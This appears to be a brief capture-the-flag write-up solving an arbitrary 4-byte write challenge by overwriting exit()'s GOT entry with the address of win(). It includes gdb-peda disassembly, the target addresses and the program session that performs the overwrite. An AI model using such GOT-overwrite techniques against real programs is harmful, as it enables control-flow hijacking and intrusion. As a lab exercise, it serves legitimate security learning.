The program allows us to write 4 bytes to an arbitrary location in memory. The existence of a win() function,
the hint at GOT, and the presence of puts() and exit() make it clear that we need to rewrite part of the GOT
to redirect to win(). All we need are the addresses for exit and win.

gdb-peda$ pdisass exit
Dump of assembler code for function exit@plt:
   0x080483f0 <+0>:     jmp    DWORD PTR ds:0x804a014
   0x080483f6 <+6>:     push   0x10
   0x080483fb <+11>:    jmp    0x80483c0
End of assembler dump.
gdb-peda$ p &win
$1 = (<text variable, no debug info> *) 0x804854b <win>

I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?
0x804a014
Okay, now what value would you like to write to 0x804a014
0x804854b
Okay, writing 0x804854b to 0x804a014
Okay, exiting now...
